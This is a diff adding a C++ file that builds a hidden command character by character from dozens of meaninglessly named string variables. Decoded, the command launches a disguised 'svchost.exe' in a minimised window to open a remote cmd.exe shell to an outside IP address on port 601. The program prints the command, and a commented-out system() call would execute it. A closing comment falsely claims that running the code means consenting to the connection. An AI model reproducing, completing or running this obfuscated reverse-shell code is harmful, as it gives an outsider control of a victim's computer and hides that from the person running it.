@@ -1,0 +1,83 @@
+#include <iostream>
+#include <string>
+
+int main(int argc, char *argv[])
+{
+    std::string Zcdzcez = "a";
+    std::string gdefze = "A";
+    std::string VDVd700 = "b";
+    std::string dziahdza78698 = "B";
+    std::string fezjbfize687689 = "c";
+    std::string fezjfbehzf7868 = "C";
+    std::string aVV7698 = "d";
+    std::string aczeczecYY8978 = "D";
+    std::string acJVCHSKVC80970 = "e";
+    std::string acdxscsd = "E";
+    std::string adzdez = "f";
+    std::string GHBKJ = "F";
+    std::string j798EY98Bhjc = "g";
+    std::string B687687 = "G";
+    std::string cdxscsd68769 = "h";
+    std::string JKBJBLB798798 = "H";
+    std::string koalak = "i";
+    std::string karalak = "I";
+    std::string michel = "j";
+    std::string Mana = "J";
+    std::string Patrice = "k";
+    std::string Subway = "K";
+    std::string Notifiate = "l";
+    std::string Kalakor = "L";
+    std::string BVHGVH97987 = "m";
+    std::string HOJOCSQ6897 = "M";
+    std::string BCBBQ6987 = "n";
+    std::string cqnsnclqs78998 = "N";
+    std::string GIUCibbi6567587 = "o";
+    std::string IJiojioj86 = "O";
+    std::string Tomato = "p";
+    std::string Ketchup = "P";
+    std::string Mayop = "q";
+    std::string Salad = "Q";
+    std::string DUIZahdnza7989869 = "r";
+    std::string K87869698 = "R";
+    std::string DGZYFAYDF876878696867ZD89A89D6AZ786D78AZ6 = "s";
+    std::string DZAGDIZAD66869698 = "S";
+    std::string DNZKJAHDJIAGDUIA768766986 = "t";
+    std::string dzahdizadhuzah8Y767689 = "T";
+    std::string dzad76876876dzajbdzad = "u";
+    std::string adzadzadzakbdhza798709 = "U";
+    std::string dzajdhzagidUGYD987987 = "v";
+    std::string DBZAHVJDtT87Y = "V";
+    std::string adzadzadNJBDIAZB = "w";
+    std::string a6987877070DBZABDBAJBDAYDZA7D7987878798D7ZADZA8D7987 = "W";
+    std::string dzakjdbzadiza669698 = "x";
+    std::string dzajkbdhzavd7867687687 = "X";
+    std::string dzajbdzgagduiza6876689779 = "y";
+    std::string djkzabdgzaydgyuAZFUDi78687097097 = "Y";
+    std::string adzadzabdhgdzadzadzadnzbahdguzagdizagiudgjzabdiugzahdvzahgfdzavdzaudgjhzavdhzadjhza = "z";
+    std::string d8897897327E274 = "Z";
+    std::string DBHBZJHVADHVAHGDVZADDZADADA7653892659723468732984637264QSCKSQCHVhvcsghvqghcsqghfcghsqhgfchsqcjsq = "/";
+    std::string c8879872 = "&";
+    std::string c8767868798 = ".";
+    std::string xhdiuegzfeez798798 = " ";
+    std::string zadbzagdh786878979 = "1";
+    std::string dzakjdbjzahdjzajhd = "2";
+    std::string DBHZBHDBAHD67867868687687687687a = "3";
+    std::string auyFFDIZFAYDTAFZ6876879 = "4";
+    std::string dzadbzaghVHDVGZAVDa = "5";
+    std::string JHJ7498372879082390480923a = "6";
+    std::string GDHGDZGDGSFDYZ669877a = "7";
+    std::string aFJEHZIFGIUEZGFYZE78978798789696769 = "8";
+    std::string FJEGGAGZAUDDHZAIU687687687687 = "9";
+    std::string afbehgfu7879879798 = "0";
+    std::string aFZAFA798 = "'";
+    std::string GDGIDGI687687686969 = "^";
+    std::string aFZAFA798hfohroifjoeirf = "(";
+    std::string aFZAFgfsdgdsgdsfgA798 = ")";
+    std::string a78698789VFGHFZ = "-";
+    std::string aFZEVFHUEZUF789797987987987897 = ">";
+    std::string aFZEVFHUEZUF789797987987987frsehfiegqfsf897 = ":";
+    std::cout << DZAGDIZAD66869698 + dzahdizadhuzah8Y767689 + gdefze + K87869698 + dzahdizadhuzah8Y767689 + xhdiuegzfeez798798 + DBHBZJHVADHVAHGDVZADDZADADA7653892659723468732984637264QSCKSQCHVhvcsghvqghcsqghfcghsqhgfchsqcjsq + HOJOCSQ6897 + karalak + cqnsnclqs78998 + xhdiuegzfeez798798 + fezjfbehzf7868 + aFZEVFHUEZUF789797987987987frsehfiegqfsf897 + DBHBZJHVADHVAHGDVZADDZADADA7653892659723468732984637264QSCKSQCHVhvcsghvqghcsqghfcghsqhgfchsqcjsq + DZAGDIZAD66869698 + dzajbdzgagduiza6876689779 + DGZYFAYDF876878696867ZD89A89D6AZ786D78AZ6 + DNZKJAHDJIAGDUIA768766986 + acJVCHSKVC80970 + BVHGVH97987 + DBHBZJHVADHVAHGDVZADDZADADA7653892659723468732984637264QSCKSQCHVhvcsghvqghcsqghfcghsqhgfchsqcjsq + DGZYFAYDF876878696867ZD89A89D6AZ786D78AZ6 + dzajdhzagidUGYD987987 + fezjbfize687689 + cdxscsd68769 + GIUCibbi6567587 + DGZYFAYDF876878696867ZD89A89D6AZ786D78AZ6 + DNZKJAHDJIAGDUIA768766986 + c8767868798 + acJVCHSKVC80970 + dzakjdbzadiza669698 + acJVCHSKVC80970 + xhdiuegzfeez798798 + dzadbzaghVHDVGZAVDa + zadbzagdh786878979 + c8767868798 + DBHZBHDBAHD67867868687687687687a + aFJEHZIFGIUEZGFYZE78978798789696769 + c8767868798 + dzakjdbjzahdjzajhd + DBHZBHDBAHD67867868687687687687a + GDHGDZGDGSFDYZ669877a + c8767868798 + zadbzagdh786878979 + auyFFDIZFAYDTAFZ6876879 + zadbzagdh786878979 + xhdiuegzfeez798798 + JHJ7498372879082390480923a + afbehgfu7879879798 + zadbzagdh786878979 + xhdiuegzfeez798798 + a78698789VFGHFZ + acJVCHSKVC80970 + xhdiuegzfeez798798 + fezjbfize687689 + BVHGVH97987 + aVV7698 + c8767868798 + acJVCHSKVC80970 + dzakjdbzadiza669698 + acJVCHSKVC80970 + xhdiuegzfeez798798 + a78698789VFGHFZ + aVV7698 + xhdiuegzfeez798798 + GDGIDGI687687686969;
+    //system((DZAGDIZAD66869698 + dzahdizadhuzah8Y767689 + gdefze + K87869698 + dzahdizadhuzah8Y767689 + xhdiuegzfeez798798 + DBHBZJHVADHVAHGDVZADDZADADA7653892659723468732984637264QSCKSQCHVhvcsghvqghcsqghfcghsqhgfchsqcjsq + HOJOCSQ6897 + karalak + cqnsnclqs78998 + xhdiuegzfeez798798 + fezjfbehzf7868 + aFZEVFHUEZUF789797987987987frsehfiegqfsf897 + DBHBZJHVADHVAHGDVZADDZADADA7653892659723468732984637264QSCKSQCHVhvcsghvqghcsqghfcghsqhgfchsqcjsq + DZAGDIZAD66869698 + dzajbdzgagduiza6876689779 + DGZYFAYDF876878696867ZD89A89D6AZ786D78AZ6 + DNZKJAHDJIAGDUIA768766986 + acJVCHSKVC80970 + BVHGVH97987 + DBHBZJHVADHVAHGDVZADDZADADA7653892659723468732984637264QSCKSQCHVhvcsghvqghcsqghfcghsqhgfchsqcjsq + DGZYFAYDF876878696867ZD89A89D6AZ786D78AZ6 + dzajdhzagidUGYD987987 + fezjbfize687689 + cdxscsd68769 + GIUCibbi6567587 + DGZYFAYDF876878696867ZD89A89D6AZ786D78AZ6 + DNZKJAHDJIAGDUIA768766986 + c8767868798 + acJVCHSKVC80970 + dzakjdbzadiza669698 + acJVCHSKVC80970 + xhdiuegzfeez798798 + dzadbzaghVHDVGZAVDa + zadbzagdh786878979 + c8767868798 + DBHZBHDBAHD67867868687687687687a + aFJEHZIFGIUEZGFYZE78978798789696769 + c8767868798 + dzakjdbjzahdjzajhd + DBHZBHDBAHD67867868687687687687a + GDHGDZGDGSFDYZ669877a + c8767868798 + zadbzagdh786878979 + auyFFDIZFAYDTAFZ6876879 + zadbzagdh786878979 + xhdiuegzfeez798798 + JHJ7498372879082390480923a + afbehgfu7879879798 + zadbzagdh786878979 + xhdiuegzfeez798798 + a78698789VFGHFZ + acJVCHSKVC80970 + xhdiuegzfeez798798 + fezjbfize687689 + BVHGVH97987 + aVV7698 + c8767868798 + acJVCHSKVC80970 + dzakjdbzadiza669698 + acJVCHSKVC80970 + xhdiuegzfeez798798 + a78698789VFGHFZ + aVV7698 + xhdiuegzfeez798798 + GDGIDGI687687686969).c_str());
+    return 0;
+}
+//RUNNING THIS CODE MADE YOU AGREE TO THE CREATED CONNECTION WITH THE IP LINKED TO IT.
